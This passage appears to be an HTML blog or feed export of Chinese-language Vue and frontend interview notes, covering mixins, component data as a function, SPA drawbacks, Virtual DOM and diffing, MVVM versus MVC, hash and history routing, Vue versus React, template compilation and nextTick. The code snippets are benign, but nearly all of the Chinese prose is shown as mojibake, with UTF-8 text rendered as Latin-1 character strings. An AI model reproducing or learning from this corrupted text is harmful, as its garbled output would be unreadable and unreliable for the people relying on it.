class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ mixins æ··å…¥çš„é’©å­å‡½æ•°ä¼šå…ˆäºç»„ä»¶å†…çš„é’©å­å‡½æ•°æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨é‡åˆ°åŒåé€‰é¡¹çš„æ—¶å€™ä¹Ÿä¼šæœ‰é€‰æ‹©æ€§çš„è¿›è¡Œåˆå¹¶ã€‚</p><h2 id="ç»„ä»¶ä¸­-data-ä»€ä¹ˆæ—¶å€™å¯ä»¥ä½¿ç”¨å¯¹è±¡ï¼Ÿ"><a href="#ç»„ä»¶ä¸­-data-ä»€ä¹ˆæ—¶å€™å¯ä»¥ä½¿ç”¨å¯¹è±¡ï¼Ÿ" class="headerlink" title="ç»„ä»¶ä¸­ data ä»€ä¹ˆæ—¶å€™å¯ä»¥ä½¿ç”¨å¯¹è±¡ï¼Ÿ"></a>ç»„ä»¶ä¸­ data ä»€ä¹ˆæ—¶å€™å¯ä»¥ä½¿ç”¨å¯¹è±¡ï¼Ÿ</h2><p>ç»„ä»¶å¤ç”¨æ—¶æ‰€æœ‰ç»„ä»¶å®ä¾‹éƒ½ä¼šå…±äº« <code>data</code>ï¼Œå¦‚æœ <code>data</code> æ˜¯å¯¹è±¡çš„è¯ï¼Œå°±ä¼šé€ æˆä¸€ä¸ªç»„ä»¶ä¿®æ”¹ <code>data</code> ä»¥åä¼šå½±å“åˆ°å…¶ä»–æ‰€æœ‰ç»„ä»¶ï¼Œæ‰€ä»¥éœ€è¦å°† <code>data</code> å†™æˆå‡½æ•°ï¼Œæ¯æ¬¡ç”¨åˆ°å°±è°ƒç”¨ä¸€æ¬¡å‡½æ•°è·å¾—æ–°çš„æ•°æ®ã€‚</p><p>å½“æˆ‘ä»¬ä½¿ç”¨ <code>new Vue()</code> çš„æ–¹å¼æ—¶ï¼Œæ— è®ºæˆ‘ä»¬å°† <code>data</code> è®¾ç½®ä¸ºå¯¹è±¡è¿˜æ˜¯å‡½æ•°éƒ½æ˜¯å¯ä»¥çš„ï¼Œå› ä¸º <code>new Vue()</code> çš„æ–¹å¼æ˜¯ç”Ÿæˆä¸€ä¸ªæ ¹ç»„ä»¶ï¼Œè¯¥ç»„ä»¶ä¸ä¼šå¤ç”¨ï¼Œä¹Ÿå°±ä¸å­˜åœ¨å…±äº« <code>data</code> çš„æƒ…å†µäº†ã€‚</p><h2 id="SPA-ç¼ºç‚¹"><a href="#SPA-ç¼ºç‚¹" class="headerlink" title="SPA ç¼ºç‚¹"></a>SPA ç¼ºç‚¹</h2><ul><li>ä¸åˆ©äº SEOï¼ˆæœç´¢å¼•æ“ï¼‰</li><li>é¦–å±æ¸²æŸ“æ—¶é—´é•¿</li></ul><p>æœåŠ¡ç«¯æ¸²æŸ“SSR<br>é¢„æ¸²æŸ“Prerendering</p><h2 id="ä»€ä¹ˆæ˜¯-Virtual-DOMï¼Ÿä¸ºä»€ä¹ˆ-Virtual-DOM-æ¯”åŸç”Ÿ-DOM-å¿«ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-Virtual-DOMï¼Ÿä¸ºä»€ä¹ˆ-Virtual-DOM-æ¯”åŸç”Ÿ-DOM-å¿«ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ Virtual DOMï¼Ÿä¸ºä»€ä¹ˆ Virtual DOM æ¯”åŸç”Ÿ DOM å¿«ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ Virtual DOMï¼Ÿä¸ºä»€ä¹ˆ Virtual DOM æ¯”åŸç”Ÿ DOM å¿«ï¼Ÿ</h2><p>é¦–å…ˆå¯¹æˆ‘ä»¬å°†è¦æ’å…¥åˆ°æ–‡æ¡£ä¸­çš„ DOM æ ‘ç»“æ„è¿›è¡Œåˆ†æï¼Œä½¿ç”¨ js å¯¹è±¡å°†å…¶è¡¨ç¤ºå‡ºæ¥ï¼Œæ¯”å¦‚ä¸€ä¸ªå…ƒç´ å¯¹è±¡ï¼ŒåŒ…å« TagNameã€props å’Œ Children è¿™äº›å±æ€§ã€‚ç„¶åæˆ‘ä»¬å°†è¿™ä¸ª js å¯¹è±¡æ ‘ç»™ä¿å­˜ä¸‹æ¥ï¼Œæœ€åå†å°† DOM ç‰‡æ®µæ’å…¥åˆ°æ–‡æ¡£ä¸­ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ul = &#123;</span><br><span class="line">  <span class="attr">tag</span>: <span class="string">&#x27;ul&#x27;</span>,</span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">class</span>: <span class="string">&#x27;list&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">children</span>: &#123;</span><br><span class="line">    <span class="attr">tag</span>: <span class="string">&#x27;li&#x27;</span>,</span><br><span class="line">    <span class="attr">children</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç å¯¹åº”çš„ DOM å°±æ˜¯</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&#x27;list&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å½“é¡µé¢çš„çŠ¶æ€å‘ç”Ÿæ”¹å˜ï¼Œæˆ‘ä»¬éœ€è¦å¯¹é¡µé¢çš„ DOM çš„ç»“æ„è¿›è¡Œè°ƒæ•´çš„æ—¶å€™ï¼Œæˆ‘ä»¬é¦–å…ˆæ ¹æ®å˜æ›´çš„çŠ¶æ€ï¼Œé‡æ–°æ„å»ºèµ·ä¸€æ£µå¯¹è±¡æ ‘ï¼Œç„¶åå°†è¿™æ£µæ–°çš„å¯¹è±¡æ ‘å’Œæ—§çš„å¯¹è±¡æ ‘è¿›è¡Œæ¯”è¾ƒï¼Œè®°å½•ä¸‹ä¸¤æ£µæ ‘çš„å·®å¼‚ã€‚æœ€åå°†è®°å½•çš„æœ‰å·®å¼‚çš„åœ°æ–¹åº”ç”¨åˆ°çœŸæ­£çš„ DOM æ ‘ä¸­å»ï¼Œè¿™æ ·è§†å›¾å°±æ›´æ–°äº†ã€‚åˆ¤æ–­å·®å¼‚çš„ç®—æ³•åˆ†ä¸ºä¸¤æ­¥ï¼š</p><ul><li>é¦–å…ˆä»ä¸Šè‡³ä¸‹ï¼Œä»å·¦å¾€å³éå†å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æ ‘çš„æ·±åº¦éå†ï¼Œè¿™ä¸€æ­¥ä¸­ä¼šç»™æ¯ä¸ªèŠ‚ç‚¹æ·»åŠ ç´¢å¼•ï¼Œä¾¿äºæœ€åæ¸²æŸ“å·®å¼‚</li><li>ä¸€æ—¦èŠ‚ç‚¹æœ‰å­å…ƒç´ ï¼Œå°±å»åˆ¤æ–­å­å…ƒç´ æ˜¯å¦æœ‰ä¸åŒ</li></ul><p>åœ¨ç¬¬ä¸€æ­¥ç®—æ³•ä¸­æˆ‘ä»¬éœ€è¦åˆ¤æ–­æ–°æ—§èŠ‚ç‚¹çš„ <code>tagName</code> æ˜¯å¦ç›¸åŒï¼Œå¦‚æœä¸ç›¸åŒçš„è¯å°±ä»£è¡¨èŠ‚ç‚¹è¢«æ›¿æ¢äº†ã€‚å¦‚æœæ²¡æœ‰æ›´æ”¹ <code>tagName</code> çš„è¯ï¼Œå°±éœ€è¦åˆ¤æ–­æ˜¯å¦æœ‰å­å…ƒç´ ï¼Œæœ‰çš„è¯å°±è¿›è¡Œç¬¬äºŒæ­¥ç®—æ³•ã€‚</p><p>åœ¨ç¬¬äºŒæ­¥ç®—æ³•ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åˆ¤æ–­åŸæœ¬çš„åˆ—è¡¨ä¸­æ˜¯å¦æœ‰èŠ‚ç‚¹è¢«ç§»é™¤ï¼Œåœ¨æ–°çš„åˆ—è¡¨ä¸­éœ€è¦åˆ¤æ–­æ˜¯å¦æœ‰æ–°çš„èŠ‚ç‚¹åŠ å…¥ï¼Œè¿˜éœ€è¦åˆ¤æ–­èŠ‚ç‚¹æ˜¯å¦æœ‰ç§»åŠ¨ã€‚</p><p>æˆ‘è®¤ä¸º Virtual DOM è¿™ç§æ–¹æ³•å¯¹äºæˆ‘ä»¬éœ€è¦æœ‰å¤§é‡çš„ DOM æ“ä½œçš„æ—¶å€™ï¼Œèƒ½å¤Ÿå¾ˆå¥½çš„æé«˜æˆ‘ä»¬çš„æ“ä½œæ•ˆç‡ï¼Œé€šè¿‡åœ¨æ“ä½œå‰ç¡®å®šéœ€è¦åšçš„æœ€å°ä¿®æ”¹ï¼Œå°½å¯èƒ½çš„å‡å°‘ DOM æ“ä½œå¸¦æ¥çš„é‡æµå’Œé‡ç»˜çš„å½±å“ã€‚å…¶å® Virtual DOM å¹¶ä¸ä¸€å®šæ¯”æˆ‘ä»¬çœŸå®çš„æ“ä½œ DOM è¦å¿«ï¼Œè¿™ç§æ–¹æ³•çš„ç›®çš„æ˜¯ä¸ºäº†æé«˜æˆ‘ä»¬å¼€å‘æ—¶çš„å¯ç»´æŠ¤æ€§ï¼Œåœ¨ä»»æ„çš„æƒ…å†µä¸‹ï¼Œéƒ½èƒ½ä¿è¯ä¸€ä¸ªå°½é‡å°çš„æ€§èƒ½æ¶ˆè€—å»è¿›è¡Œæ“ä½œã€‚</p><p>Virtual DOM <strong>æœ€å¤§çš„ä¼˜åŠ¿</strong>ï¼š</p><ol><li>å°† Virtual DOM ä½œä¸ºä¸€ä¸ªå…¼å®¹å±‚ï¼Œè®©æˆ‘ä»¬è¿˜èƒ½å¯¹æ¥é Web ç«¯çš„ç³»ç»Ÿï¼Œå®ç°è·¨ç«¯å¼€å‘ã€‚</li><li>åŒæ ·çš„ï¼Œé€šè¿‡ Virtual DOM æˆ‘ä»¬å¯ä»¥æ¸²æŸ“åˆ°å…¶ä»–çš„å¹³å°ï¼Œæ¯”å¦‚å®ç° SSRã€åŒæ„æ¸²æŸ“ç­‰ç­‰ã€‚</li><li>å®ç°ç»„ä»¶çš„é«˜åº¦æŠ½è±¡åŒ–ã€‚</li></ol><h2 id="å¦‚ä½•æ¯”è¾ƒä¸¤ä¸ª-DOM-æ ‘çš„å·®å¼‚ï¼Ÿ"><a href="#å¦‚ä½•æ¯”è¾ƒä¸¤ä¸ª-DOM-æ ‘çš„å·®å¼‚ï¼Ÿ" class="headerlink" title="å¦‚ä½•æ¯”è¾ƒä¸¤ä¸ª DOM æ ‘çš„å·®å¼‚ï¼Ÿ"></a>å¦‚ä½•æ¯”è¾ƒä¸¤ä¸ª DOM æ ‘çš„å·®å¼‚ï¼Ÿ</h2><p>ä¸¤ä¸ªæ ‘çš„å®Œå…¨ diff ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸º O(n^3) ï¼Œä½†æ˜¯åœ¨å‰ç«¯ä¸­ï¼Œæˆ‘ä»¬å¾ˆå°‘ä¼šè·¨å±‚çº§çš„ç§»åŠ¨å…ƒç´ ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ¯”è¾ƒåŒä¸€å±‚çº§çš„å…ƒç´ è¿›è¡Œæ¯”è¾ƒï¼Œè¿™æ ·å°±å¯ä»¥å°†ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦é™ä½ä¸º O(n)ã€‚</p><p>ç®—æ³•é¦–å…ˆä¼šå¯¹æ–°æ—§ä¸¤æ£µæ ‘è¿›è¡Œä¸€ä¸ªæ·±åº¦ä¼˜å…ˆçš„éå†ï¼Œè¿™æ ·æ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šæœ‰ä¸€ä¸ªåºå·ã€‚åœ¨æ·±åº¦éå†çš„æ—¶å€™ï¼Œæ¯éå†åˆ°ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæˆ‘ä»¬å°±å°†è¿™ä¸ªèŠ‚ç‚¹å’Œæ–°çš„æ ‘ä¸­çš„èŠ‚ç‚¹è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæœ‰å·®å¼‚ï¼Œåˆ™å°†è¿™ä¸ªå·®å¼‚è®°å½•åˆ°ä¸€ä¸ªå¯¹è±¡ä¸­ã€‚</p><p>åœ¨å¯¹åˆ—è¡¨å…ƒç´ è¿›è¡Œå¯¹æ¯”çš„æ—¶å€™ï¼Œç”±äº TagName æ˜¯é‡å¤çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨è¿™ä¸ªæ¥å¯¹æ¯”ã€‚æˆ‘ä»¬éœ€è¦ç»™æ¯ä¸€ä¸ªå­èŠ‚ç‚¹åŠ ä¸Šä¸€ä¸ª keyï¼Œåˆ—è¡¨å¯¹æ¯”çš„æ—¶å€™ä½¿ç”¨ key æ¥è¿›è¡Œæ¯”è¾ƒï¼Œè¿™æ ·æˆ‘ä»¬æ‰èƒ½å¤Ÿå¤ç”¨è€çš„ DOM æ ‘ä¸Šçš„èŠ‚ç‚¹ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯-MVVMï¼Ÿæ¯”ä¹‹-MVC-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-MVVMï¼Ÿæ¯”ä¹‹-MVC-æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ MVVMï¼Ÿæ¯”ä¹‹ MVC æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ MVVMï¼Ÿæ¯”ä¹‹ MVC æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h2><p>View å’Œ Modelï¼š</p><ul><li>View ç”¨æˆ·çœ‹åˆ°çš„è§†å›¾</li><li>Model æœ¬åœ°æ•°æ®å’Œæ•°æ®åº“ä¸­çš„æ•°æ®</li></ul><p>ä¼ ç»Ÿçš„ MVC æ¶æ„é€šå¸¸æ˜¯ä½¿ç”¨æ§åˆ¶å™¨æ›´æ–°æ¨¡å‹ï¼Œè§†å›¾ä»æ¨¡å‹ä¸­è·å–æ•°æ®å»æ¸²æŸ“ã€‚å½“ç”¨æˆ·æœ‰è¾“å…¥æ—¶ï¼Œä¼šé€šè¿‡æ§åˆ¶å™¨å»æ›´æ–°æ¨¡å‹ï¼Œå¹¶ä¸”é€šçŸ¥è§†å›¾è¿›è¡Œæ›´æ–°ã€‚</p><p><img src="https://i.loli.net/2021/09/11/lahWzk4gVPcbs7U.png" alt="image.png"></p><p>ä½†æ˜¯ MVC æœ‰ä¸€ä¸ªå·¨å¤§çš„ç¼ºé™·å°±æ˜¯<strong>æ§åˆ¶å™¨æ‰¿æ‹…çš„è´£ä»»å¤ªå¤§</strong>äº†ï¼Œéšç€é¡¹ç›®æ„ˆåŠ å¤æ‚ï¼Œæ§åˆ¶å™¨ä¸­çš„ä»£ç ä¼šè¶Šæ¥è¶Š<strong>è‡ƒè‚¿</strong>ï¼Œå¯¼è‡´å‡ºç°ä¸åˆ©äº<strong>ç»´æŠ¤</strong>çš„æƒ…å†µã€‚</p><p>åœ¨ MVVM æ¶æ„ä¸­ï¼Œå¼•å…¥äº† <strong>ViewModel</strong> çš„æ¦‚å¿µã€‚ViewModel åªå…³å¿ƒæ•°æ®å’Œä¸šåŠ¡çš„å¤„ç†ï¼Œä¸å…³å¿ƒ View å¦‚ä½•å¤„ç†æ•°æ®ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒView å’Œ Model éƒ½å¯ä»¥ç‹¬ç«‹å‡ºæ¥ï¼Œä»»ä½•ä¸€æ–¹æ”¹å˜äº†ä¹Ÿä¸ä¸€å®šéœ€è¦æ”¹å˜å¦ä¸€æ–¹ï¼Œå¹¶ä¸”å¯ä»¥å°†ä¸€äº›å¯å¤ç”¨çš„é€»è¾‘æ”¾åœ¨ä¸€ä¸ª ViewModel ä¸­ï¼Œè®©å¤šä¸ª View å¤ç”¨è¿™ä¸ª ViewModelã€‚</p><p><img src="https://i.loli.net/2021/09/11/aFJGPc8H3E6pRrg.png" alt="image.png"></p><p>ä»¥ Vue æ¡†æ¶æ¥ä¸¾ä¾‹ï¼ŒViewModel å°±æ˜¯ç»„ä»¶çš„å®ä¾‹ã€‚View å°±æ˜¯æ¨¡æ¿ï¼ŒModel çš„è¯åœ¨å¼•å…¥ Vuex çš„æƒ…å†µä¸‹æ˜¯å®Œå…¨å¯ä»¥å’Œç»„ä»¶åˆ†ç¦»çš„ã€‚</p><p>é™¤äº†ä»¥ä¸Šä¸‰ä¸ªéƒ¨åˆ†ï¼Œå…¶å®åœ¨ MVVM ä¸­è¿˜å¼•å…¥äº†ä¸€ä¸ªéšå¼çš„ Binder å±‚ï¼Œå®ç°äº† View å’Œ ViewModel çš„ç»‘å®šã€‚è¿™ä¸ª<strong>éšå¼</strong>çš„ Binder å±‚å°±æ˜¯ Vue é€šè¿‡è§£ææ¨¡æ¿ä¸­çš„æ’å€¼å’ŒæŒ‡ä»¤ä»è€Œå®ç° View ä¸ ViewModel çš„ç»‘å®šã€‚</p><p><img src="https://i.loli.net/2021/09/11/UDACQIv2rqnBNhW.png" alt="image.png"></p><p>å¯¹äº MVVM æ¥è¯´ï¼Œå…¶å®æœ€é‡è¦çš„å¹¶ä¸æ˜¯é€šè¿‡åŒå‘ç»‘å®šæˆ–è€…å…¶ä»–çš„æ–¹å¼å°† View ä¸ ViewModel ç»‘å®šèµ·æ¥ï¼Œ<strong>è€Œæ˜¯é€šè¿‡ ViewModel å°†è§†å›¾ä¸­çš„çŠ¶æ€å’Œç”¨æˆ·çš„è¡Œä¸ºåˆ†ç¦»å‡ºä¸€ä¸ªæŠ½è±¡ï¼Œè¿™æ‰æ˜¯ MVVM çš„ç²¾é«“</strong>ã€‚</p><h2 id="å‰ç«¯è·¯ç”±åŸç†ï¼Ÿä¸¤ç§å®ç°æ–¹å¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#å‰ç«¯è·¯ç”±åŸç†ï¼Ÿä¸¤ç§å®ç°æ–¹å¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="å‰ç«¯è·¯ç”±åŸç†ï¼Ÿä¸¤ç§å®ç°æ–¹å¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>å‰ç«¯è·¯ç”±åŸç†ï¼Ÿä¸¤ç§å®ç°æ–¹å¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h2><p>å‰ç«¯è·¯ç”±æœ¬è´¨å°±æ˜¯<strong>ç›‘å¬ URL çš„å˜åŒ–</strong>ï¼Œç„¶ååŒ¹é…è·¯ç”±è§„åˆ™ï¼Œæ˜¾ç¤ºç›¸åº”çš„é¡µé¢ï¼Œå¹¶ä¸”æ— é¡»åˆ·æ–°é¡µé¢ã€‚ç›®å‰å‰ç«¯ä½¿ç”¨çš„è·¯ç”±å°±åªæœ‰ä¸¤ç§å®ç°æ–¹å¼ã€‚<img src="https://i.loli.net/2021/09/18/3n8axwlMUWmpNKI.png" alt="image.png"></p><h3 id="Hash-æ¨¡å¼"><a href="#Hash-æ¨¡å¼" class="headerlink" title="Hash æ¨¡å¼"></a>Hash æ¨¡å¼</h3><p><code>www.test.com/#/</code> å°±æ˜¯ Hash URLï¼Œå½“ <code>#</code> åé¢çš„å“ˆå¸Œå€¼å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå¯ä»¥é€šè¿‡ <code>hashchange</code> äº‹ä»¶æ¥ç›‘å¬åˆ° URL çš„å˜åŒ–ï¼Œä»è€Œè¿›è¡Œè·³è½¬é¡µé¢ï¼Œå¹¶ä¸”æ— è®ºå“ˆå¸Œå€¼å¦‚ä½•å˜åŒ–ï¼ŒæœåŠ¡ç«¯æ¥æ”¶åˆ°çš„ URL è¯·æ±‚æ°¸è¿œæ˜¯ <code>www.test.com</code>ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;hashchange&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ... å…·ä½“é€»è¾‘</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>Hash æ¨¡å¼ç›¸å¯¹æ¥è¯´æ›´ç®€å•ï¼Œå¹¶ä¸”å…¼å®¹æ€§ä¹Ÿæ›´å¥½ã€‚</p><h3 id="History-æ¨¡å¼"><a href="#History-æ¨¡å¼" class="headerlink" title="History æ¨¡å¼"></a>History æ¨¡å¼</h3><p>History æ¨¡å¼æ˜¯ HTML5 æ–°æ¨å‡ºçš„åŠŸèƒ½ï¼Œä¸»è¦ä½¿ç”¨ <code>history.pushState</code> å’Œ <code>history.replaceState</code> æ”¹å˜ URLã€‚é€šè¿‡ History æ¨¡å¼æ”¹å˜ URL åŒæ ·ä¸ä¼šå¼•èµ·é¡µé¢çš„åˆ·æ–°ï¼Œåªä¼šæ›´æ–°æµè§ˆå™¨çš„å†å²è®°å½•ã€‚</p><p>å½“ç”¨æˆ·åšå‡ºæµè§ˆå™¨åŠ¨ä½œæ—¶ï¼Œæ¯”å¦‚ç‚¹å‡»åé€€æŒ‰é’®æ—¶ä¼šè§¦å‘ <code>popState</code> äº‹ä»¶</p><h3 id="ä¸¤ç§æ¨¡å¼å¯¹æ¯”"><a href="#ä¸¤ç§æ¨¡å¼å¯¹æ¯”" class="headerlink" title="ä¸¤ç§æ¨¡å¼å¯¹æ¯”"></a>ä¸¤ç§æ¨¡å¼å¯¹æ¯”</h3><ul><li>Hash æ¨¡å¼åªå¯ä»¥æ›´æ”¹ <code>#</code> åé¢çš„å†…å®¹ï¼ŒHistory æ¨¡å¼å¯ä»¥é€šè¿‡ API è®¾ç½®ä»»æ„çš„åŒæº URL</li><li>History æ¨¡å¼å¯ä»¥é€šè¿‡ API æ·»åŠ ä»»æ„ç±»å‹çš„æ•°æ®åˆ°å†å²è®°å½•ä¸­ï¼ŒHash æ¨¡å¼åªèƒ½æ›´æ”¹å“ˆå¸Œå€¼ï¼Œä¹Ÿå°±æ˜¯å­—ç¬¦ä¸²</li><li>Hash æ¨¡å¼æ— éœ€åç«¯é…ç½®ï¼Œå¹¶ä¸”å…¼å®¹æ€§å¥½ã€‚History æ¨¡å¼åœ¨ç”¨æˆ·æ‰‹åŠ¨è¾“å…¥åœ°å€æˆ–è€…åˆ·æ–°é¡µé¢çš„æ—¶å€™ä¼šå‘èµ· URL è¯·æ±‚ï¼Œåç«¯éœ€è¦é…ç½® <code>index.html</code> é¡µé¢ç”¨äºåŒ¹é…ä¸åˆ°é™æ€èµ„æºçš„æ—¶å€™</li></ul><h2 id="Vue-å’Œ-React-ä¹‹é—´çš„åŒºåˆ«"><a href="#Vue-å’Œ-React-ä¹‹é—´çš„åŒºåˆ«" class="headerlink" title="Vue å’Œ React ä¹‹é—´çš„åŒºåˆ«"></a>Vue å’Œ React ä¹‹é—´çš„åŒºåˆ«</h2><ul><li>Vue çš„è¡¨å•å¯ä»¥ä½¿ç”¨ <code>v-model</code> æ”¯æŒåŒå‘ç»‘å®šï¼Œç›¸æ¯”äº React æ¥è¯´å¼€å‘ä¸Šæ›´åŠ æ–¹ä¾¿ã€‚å½“ç„¶ <code>v-model</code> å…¶å®æ˜¯ä¸ªè¯­æ³•ç³–ï¼Œæœ¬è´¨ä¸Šå’Œ React å†™è¡¨å•çš„æ–¹å¼æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚</li><li>æ”¹å˜æ•°æ®æ–¹å¼ä¸åŒï¼ŒVue ä¿®æ”¹çŠ¶æ€ç›¸æ¯”æ¥è¯´è¦ç®€å•è®¸å¤šï¼ŒReact éœ€è¦ä½¿ç”¨ <code>setState</code> æ¥æ”¹å˜çŠ¶æ€ã€‚å¹¶ä¸” Vue çš„åº•å±‚ä½¿ç”¨äº†ä¾èµ–è¿½è¸ªï¼Œé¡µé¢æ›´æ–°æ¸²æŸ“å·²ç»æ˜¯æœ€ä¼˜çš„äº†ï¼Œä½†æ˜¯ React è¿˜æ˜¯éœ€è¦ç”¨æˆ·æ‰‹åŠ¨å»ä¼˜åŒ–è¿™æ–¹é¢çš„é—®é¢˜ã€‚</li><li>React éœ€è¦ä½¿ç”¨ JSXï¼Œæœ‰ä¸€å®šçš„ä¸Šæ‰‹æˆæœ¬ï¼Œå¹¶ä¸”éœ€è¦ä¸€æ•´å¥—çš„å·¥å…·é“¾æ”¯æŒï¼Œä½†æ˜¯å®Œå…¨å¯ä»¥é€šè¿‡ JS æ¥æ§åˆ¶é¡µé¢ï¼Œæ›´åŠ çš„çµæ´»ã€‚Vue ä½¿ç”¨äº†æ¨¡æ¿è¯­æ³•ï¼Œç›¸æ¯”äº JSX æ¥è¯´æ²¡æœ‰é‚£ä¹ˆçµæ´»ï¼Œä½†æ˜¯å®Œå…¨å¯ä»¥è„±ç¦»å·¥å…·é“¾ï¼Œé€šè¿‡ç›´æ¥ç¼–å†™ <code>render</code> å‡½æ•°å°±èƒ½åœ¨æµè§ˆå™¨ä¸­è¿è¡Œã€‚</li></ul><h2 id="ç¼–è¯‘è¿‡ç¨‹"><a href="#ç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="ç¼–è¯‘è¿‡ç¨‹"></a>ç¼–è¯‘è¿‡ç¨‹</h2><p>Vue ä¼šé€šè¿‡ç¼–è¯‘å™¨å°†æ¨¡æ¿é€šè¿‡å‡ ä¸ªé˜¶æ®µæœ€ç»ˆç¼–è¯‘ä¸º <code>render</code> å‡½æ•°ï¼Œç„¶åé€šè¿‡æ‰§è¡Œ <code>render</code> å‡½æ•°ç”Ÿæˆ Virtual DOM æœ€ç»ˆæ˜ å°„ä¸ºçœŸå® DOMã€‚ç¼–è¯‘çš„è¿‡ç¨‹åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š</p><ol><li>å°†æ¨¡æ¿è§£æä¸º AST</li><li>ä¼˜åŒ– AST</li><li>å°† AST è½¬æ¢ä¸º <code>render</code> å‡½æ•°</li></ol><p>åœ¨ç¬¬ä¸€ä¸ªé˜¶æ®µä¸­ï¼Œæœ€ä¸»è¦çš„äº‹æƒ…è¿˜æ˜¯é€šè¿‡å„ç§å„æ ·çš„æ­£åˆ™è¡¨è¾¾å¼å»åŒ¹é…æ¨¡æ¿ä¸­çš„å†…å®¹ï¼Œç„¶åå°†å†…å®¹æå–å‡ºæ¥åšå„ç§é€»è¾‘æ“ä½œï¼Œæ¥ä¸‹æ¥ä¼šç”Ÿæˆä¸€ä¸ªæœ€åŸºæœ¬çš„ AST å¯¹è±¡ã€‚ç„¶åä¼šæ ¹æ®è¿™ä¸ªæœ€åŸºæœ¬çš„ AST å¯¹è±¡ä¸­çš„å±æ€§ï¼Œè¿›ä¸€æ­¥æ‰©å±• ASTã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ç±»å‹</span></span><br><span class="line">    <span class="attr">type</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="comment">// æ ‡ç­¾</span></span><br><span class="line">    tag,</span><br><span class="line">    <span class="comment">// å±æ€§åˆ—è¡¨</span></span><br><span class="line">    <span class="attr">attrsList</span>: attrs,</span><br><span class="line">    <span class="comment">// å±æ€§æ˜ å°„</span></span><br><span class="line">    <span class="attr">attrsMap</span>: makeAttrsMap(attrs),</span><br><span class="line">    <span class="comment">// çˆ¶èŠ‚ç‚¹</span></span><br><span class="line">    parent,</span><br><span class="line">    <span class="comment">// å­èŠ‚ç‚¹</span></span><br><span class="line">    <span class="attr">children</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªé˜¶æ®µï¼šå¯¹èŠ‚ç‚¹è¿›è¡Œé™æ€å†…å®¹æå–ï¼Œä¹Ÿå°±æ˜¯å°†æ°¸è¿œä¸ä¼šå˜åŠ¨çš„èŠ‚ç‚¹æå–äº†å‡ºæ¥ï¼Œå®ç°å¤ç”¨ Virtual DOMï¼Œè·³è¿‡å¯¹æ¯”ç®—æ³•çš„åŠŸèƒ½ã€‚</p><p>æœ€åä¸€ä¸ªé˜¶æ®µï¼šé€šè¿‡ AST ç”Ÿæˆ <code>render</code> å‡½æ•°</p><h2 id="NextTick-åŸç†åˆ†æ"><a href="#NextTick-åŸç†åˆ†æ" class="headerlink" title="NextTick åŸç†åˆ†æ"></a>NextTick åŸç†åˆ†æ</h2><p><code>nextTick</code> å¯ä»¥è®©æˆ‘ä»¬åœ¨ä¸‹æ¬¡ DOM æ›´æ–°å¾ªç¯ç»“æŸä¹‹åæ‰§è¡Œå»¶è¿Ÿå›è°ƒï¼Œç”¨äºè·å¾—æ›´æ–°åçš„ DOMã€‚</p>]]></content>
    
    
      
      
